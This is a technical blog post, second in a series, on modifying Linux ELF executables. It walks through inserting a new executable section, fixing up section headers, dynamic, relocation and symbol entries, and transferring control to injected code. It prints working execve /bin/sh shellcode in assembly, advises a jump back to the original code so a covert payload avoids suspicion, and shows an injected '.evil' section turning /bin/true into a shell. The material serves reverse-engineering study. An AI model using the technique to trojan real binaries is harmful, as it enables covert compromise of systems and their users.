---
layout: post
title: "ELF Surgery, Pt. 2: Scrubs On"
description: ""
category: ELF
tags: [elf, RE, reverse engineering, exploitation, linux]
---
{% include JB/setup %}

*Be sure to read the [Previous Post]({{ BASE_PATH }}/blog/2014/12/elf-surgery-pt-1-ELF-primer/)
for background on the ELF format.*

In this series, we develop a technique to reliably modify an ELF
executable, inserting a new executable section into it and transferring
control to the section. The last post detailed the ELF format, and we
can see that there is significant, rich structure which we must tiptoe
around. If we want our slice-and-diced ELF to be a good imposter, we
need to have a clear understanding of this structure. In this post,
we'll go over the dirty details of dissecting an ELF.

<!--break-->

### The Plan

Let's recap the play from last time.

1. Find a suitable location to insert the new section, preferably within
the existing LOAD segment. I find that the best place for this is
directly before the '.text' section, but after the '.plt' section (more
on this later).
2. Fix up the section header table to make room for this new section,
and add our new entry. This mostly involves incrementing offsets (we
may also have to re-align), but we also have to maintain the original
segment mappings and make sure that dynamic objects are still pointing
to the right place in memory.
3. Inject the new section's data into its location in the buffer.
Optionally, inject an instruction at the end of the payload which
transfers control to the 'right' place; this makes your payload more
covert if this is desirable.
4. Fix up the dynamic linking and symbolic entries references to account
for the new offsets. The same must also be done for offset tables, which
are unfortunately hard-coded with virtual offsets.

At a high level, this doesn't look to be terribly challenging- and the
truth is, it's not. The hard part of this task is the book-keeping- the
ELF has a lot of expectations as to where the bytes are and what the
bytes say, so we have to consider almost every section of the ELF in
isolation to ensure the correctness.

### 1: Find the Injection Point

One absolute requirement of this task is that your new section must be
in a LOAD segment, if you want to execute its contents. This is for a
fairly simple reason- if it's not a LOAD segment, it won't be mapped
into virtual memory. 

The simplest way to go about this is to extend the segment that the
program text lives in. This includes 'init', 'plt', and, of course,
'text'. For reliability reasons, the best place to stick your code in is
right where '.text' starts. Any executable binary has this section, and
so you know for a fact that it's somewhere in the ELF. The 'plt'
section, on the other hand, may be omitted. 

The PLT, or the Procedure Linkage Table, is nothing but a table of stubs
at a known location. These stubs direct control to an entry in the GOT
(Global Offset Table), which in turn transfers control to some
corresponding shared library function. This double-indirection enables
an ELF to load a shared object almost anywhere in memory while keeping a
fixed location to call no matter where the actual function is. We can
dynamically fix up the GOT to point to the actual function's location,
much easier than fixing up every call to the function in the program
text.

However, the PLT is only necessary for ELFs which do dynamic relocation,
and so in the general case it's best to not assume that there is such a
section. For this reason, the injection point will lie after the PLT if
it exists (since then we don't have to shift its bytes forward, which is
useful since it is meant to be at a fixed location), and if it does not,
simply inject before the program text.

### 2: Fix up the Section Header Table

A significant amount of effort will be spent in the book-keeping for the
sections and section headers. Because we are inserting a new section, we
will need a new entry in the table, with an accompanying entry in the
`shstrtab`, which is a string table for section names. Beyond this,
since we're inserting new bytes into the middle of the ELF, we also need
to modify the offset of every section that comes after our new data.
Finally, since there are some sections that have to refer other
sections, we need to ensure that there are no side effects that break
this relationship.

We'll do this out of order, simply because the implementation was easier
that way. The first step is to expand the string table section, and
shift up the sections that follow it to keep consistent offsets. A
generic function for expanding a section is as follows:


    /* Expand section number shdr_ind by n bytes, fixing up the offsets
     * of all sections that follow. The fixup is guaranteed to be at
     * least n bytes, but may be more to maintain alignment. All
     * necessary sections will be shifted by the same amount. 
     */
    int expand_section(char *elf, 
            int shdr_ind, 
            ElfN_Shdr *dyn_shdr,
            size_t n)
    {
         int ret;
         ElfN_Shdr *next;
         next = get_s_header(elf,shdr_ind+1);
         if(next)
             ret = shift_sh_offsets(elf, next, dyn_shdr, n);
         else
             ret = n;

         shdr->sh_size += n;

         /* Also expand and shift segments */
         UWORD shdata_addr;
         shdata_addr = (UWORD)elf + shdr->sh_offset;
         expand_segments(elf,(void *)shdata_addr,ret);
                                                             
         return ret;
    }              

This is pretty simple so far. What is hidden inside the
`shift_sh_offsets` routine is some work to fix up the dynamic objects
that are in a section to be shifted, which we'll delve into in a bit.

A keen observer will realize another thing that this has broken- the
section-segment mapping. Since we are moving sections around, there will
be some bytes that are pushed out of their original segment. We take
care of this with the `expand_segments` routine, which is fairly similar
in flavour to the above code. 

We also need to repeat this act for the string table- we need a name for
our section, and the string table thus needs to be extended. The section
which needs to be expanded here is the '.shstrtab' section, which is a
number of null-terminated character sequences that label each section.
An ELF often has many string tables, but we're only concerned with this
one. This is a straightforward modification- extend the section with the
above routine, and inject a section name into the buffer. 

Once we've done all of our expansions, we just need to add a new entry
to the section header table itself. Let's take a look at the description
for a section table entry:

    typedef struct {
        uint32_t   sh_name;         /* Offset into the shstrtab */
        uint32_t   sh_type;         /* SHT_PROGBITS */
        uint64_t   sh_flags;        /* SHF_ALLOC | SHF_EXECINSTR */
        Elf64_Addr sh_addr;         /* code_loc - elf_base */
        Elf64_Off  sh_offset;       /* code_loc - elf_base */
        uint64_t   sh_size;         /* code_sz + REDIR_SZ */
        uint32_t   sh_link;         /* Not relevant for SHT_PROGBITS */ 
        uint32_t   sh_info;         /* Not relevant for SHT_PROGBITS */
        uint64_t   sh_addralign;    /* Same as .text addralign (4) */
        uint64_t   sh_entsize;      /* Not relevant for SHT_PROGBITS */
    } Elf64_Shdr;

We simply set up a new instance of a header and insert it into the
table.

### 3: Inject the code, add a control transfer

What makes for a good injection? Ideally, we want our code to be small,
but powerful. There are a number of great ideas here, but the classic
injection artifact is shellcode. Shellcode is a sequence of machine
instructions that will typically be between 20 and 80 bytes, which are
used as a small stub to bring up an interactive shell for a malicious
user when executed. The archetypal shellcode looks like this in C
(though they're never written in C, for reasons I'll discuss in a
second):

    #include <unistd.h>
    #include <sys/syscall.h>
    int main() {
        char *str = "/bin/sh";
        char **args = NULL;
        syscall(SYS_execve, str, args, NULL);
        return 0;
    }

Now, why can't we just write this in C, compile it and use that? The
problem is twofold. Firstly, the compiler will ultimately be producing
an ELF from our source code, but all we want are program bytes. If this
program is compiled as-is, you're looking at about 4KB of an ELF-
equivalent shellcode can be written in 27 bytes. Secondly, we need to
have zero reliance on any shared libraries- our code needs to work
completely on its own. That's why shellcode is always written in
assembly. This is the same bit of shellcode in assembly (courtesy of 
http://shell-storm.org/shellcode/files/shellcode-698.php):


    xor    %eax,%eax    /* Zero the EAX reg */
    push   %eax         /* Push 0 to TOS */
    push   $0x68732f2f  /* Push "//sh" */
    push   $0x6e69622f  /* Push "/bin" */
    mov    %esp,%ebx    /* Save SP */
    mov    %eax,%ecx    /* Write 0 to ECX */
    mov    %eax,%edx    /* Write 0 to EDX */
    mov    $0xb,%al     /* Write 0xb (syscall # for execve) to AL */
    int    $0x80        /* SYSCALL */
    xor    %eax,%eax    /* Zero the EAX reg */
    inc    %eax         /* EAX ++ (syscall # for exit) */
    int    $0x80        /* SYSCALL */

Once this is assembled, this is exactly 27 bytes of fun. This is a great
bit of code for injection, since it's compact but gives us total control
by dropping a shell.

Now, it's also not a bad idea to have a control transfer instruction
back to the 'regular' code after our injection code. In this example, it
won't run (since the call to execve replaces the process address space,
and since we catch errors by also calling exit(2)). However, if you want
to do something more covert (say, connect to a malicious server), you
may want to have this run in the background as a forked process- and so
you want the original program to do its usual job to avoid suspicion.

This is pretty simple- just calculate the difference between the old
start location and the location of the JMP instruction you inject, and
use this offset as the destination for JMP.

### 4: Fix up dynamic objects and symbols

We're in the home stretch now- the code is in place, the sections are
all legal and mapped to the right segments, and for very simple ELFs,
what we have so far will work. However, there's still plenty of work to
do to account for the more complex features of ELFs. In particular we
need to consider dynamic objects, relocation sections, and symbols- all
of which will generally have some fixed address which we probably broke.

Having this section last is a bit of a misnomer- this is something that
my program is constantly fixing up. I'll go through a number of ways in
which we can break the ELF if we're not careful, and strategies to
prevent this.

The first thing that can happen is fairly simple to fix. Some ELF
sections have a `sh_link` field which holds an index that corresponds to
some other section. This is used in only some sections, including 
`SHT_DYNAMIC`, `SHT_REL(A)`, and `SHT_SYMTAB` sections. For each section
that has a valid `sh_link` field, we simply increase the index by one if
we have inserted a section at a lower index in the table. Easy fix- we
do this whenever a new section is added to the table.

When we shift about our sections in the process of expanding a section
or adding room for a new one, we will also need to fix up dynamic
objects, if the ELF participates in dynamic linking (all but the
simplest do!). A dynamic section has a number of dynamic entries with
this signature:

    typedef struct {
           Elf64_Sxword    d_tag;
           union {
                   Elf64_Xword     d_val;
                   Elf64_Addr      d_ptr;
           } d_un;
    } Elf64_Dyn; 

And so are nothing more than a pair between an offset in a string table,
and an address. We can get a taste for this with the `readelf` tool:

    readelf /bin/true --dynsyms
    
    Symbol table '.dynsym' contains 55 entries:
       Num:    Value          Size Type    Bind   Vis      Ndx Name
         0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
         1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __uflow@GLIBC_2.2.5 (2)
         2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getenv@GLIBC_2.2.5 (2)
         3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.2.5 (2)
        ...
        52: 0000000000606250     8 OBJECT  GLOBAL DEFAULT   25 __progname_full@GLIBC_2.2.5 (2)
        53: 0000000000606260     8 OBJECT  GLOBAL DEFAULT   25 stderr@GLIBC_2.2.5 (2)
        54: 0000000000606248     8 OBJECT  GLOBAL DEFAULT   25 stdout@GLIBC_2.2.5 (2)

Most entries point to familiar standard library functions, but curiously
have a value of 0. This is because these are mapped in dynamically! We
don't know where these will end up, it depends on where the shared
object files are loaded in memory. These are no concern. However, some
of these have fixed addresses. All we need to do for these is to
increase their address to correspond to the same byte, given the size of
our section expansion (this may not even be necessary, if the dynamic
address is lower than where we've made our expansion).

The last piece of the puzzle are relocatable objects. Relocation is
simply matching up symbolic references with definitions. This is
important for shared object file data and functions, since we don't have
a guarantee that they will always be loaded to the same place in memory
at each execution. A relocation entry is even more simple than a dynamic
entry:

    typedef struct {
           Elf64_Addr      r_offset;
           Elf64_Xword     r_info;
    } Elf64_Rel;

It's nothing but a pair consisting of an offset at which we apply the
relocation action, and the index in a symbol table at which the
relocation is made (plus the type of relocation to apply). Note that
there are also `ELF64_Rela` structs defined- these are the same as
above, but with a 64 bit addend (which is ignored on x86_64 Linux ELFs,
and alway set to 0).

Here is sample output from `readelf` that shows a few relocation
entries. In particular, these are relocation objects that are associated
with the PLT (recall that the PLT is a number of trampolines which give
a fixed location for dynamically located library functions):

    Relocation section '.rela.plt' at offset 0xbb0 contains 48 entries:
      Offset          Info           Type           Sym. Value    Sym. Name + Addend
    000000606018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 __uflow + 0
    000000606020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 getenv + 0
    000000606028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 free + 0

Once again, all we need to do is increase the offsets to match up the
old bytes to their new location.

The last thing to take care of is symbols, which are dealt with in
largely the same way as dynamic and relocatable objects. The one caveat
is clear when you see the definition of a symbol:


    typedef struct {
           Elf64_Word      st_name;
           unsigned char   st_info;
           unsigned char   st_other;
           Elf64_Half      st_shndx;
           Elf64_Addr      st_value;
           Elf64_Xword     st_size;
    } Elf64_Sym;

The `st_shndx` entry is an index to a section! We also need to increment
this to account for our newly inserted section. The `st_value` is
increased in the same way we do for the relocatable `r_offset`.

### Putting it all together

Take a look at https://www.github.com/JamesSullivan1/inject/ to see the
finished product. Here's a sample session which demonstrates the
program's effect:

    james@proto $ ./true
    james@proto $ echo $?
    0
    james@proto $ readelf -S true
    There are 28 section headers, starting at offset 0x6360:

    Section Headers:
    ....
      [11] .init             PROGBITS         0000000000401030  00001030
           000000000000001a  0000000000000000  AX       0     0     4
      [12] .plt              PROGBITS         0000000000401050  00001050
           0000000000000310  0000000000000010  AX       0     0     16
      [13] .text             PROGBITS         0000000000401360  00001360
           0000000000002a39  0000000000000000  AX       0     0     16
    ....
    Key to Flags:
      W (write), A (alloc), X (execute), M (merge), S (strings), l (large)
      I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
      O (extra OS processing required) o (OS specific), p (processor
    specific)


    james@proto $ ./inject shellcode.dat true
    Section .evil injected into true
    james@proto $ readelf -S true
    There are 29 section headers, starting at offset 0x65a6:

    Section Headers:
    ....
      [11] .init             PROGBITS         0000000000401030  00001030
           000000000000001a  0000000000000000  AX       0     0     4
      [12] .plt              PROGBITS         0000000000401050  00001050
           0000000000000310  0000000000000010  AX       0     0     16
      [13] .evil             PROGBITS         0000000000401360  00001360
           0000000000000035  0000000000000000  AX       0     0     4
      [14] .text             PROGBITS         0000000000401460  00001460
           0000000000002a39  0000000000000000  AX       0     0     16
    ....
    Key to Flags:
      W (write), A (alloc), X (execute), M (merge), S (strings), l (large)
      I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
      O (extra OS processing required) o (OS specific), p (processor
    specific)

    james@proto $ ./true
    sh-4.3$ echo pwned
    pwned

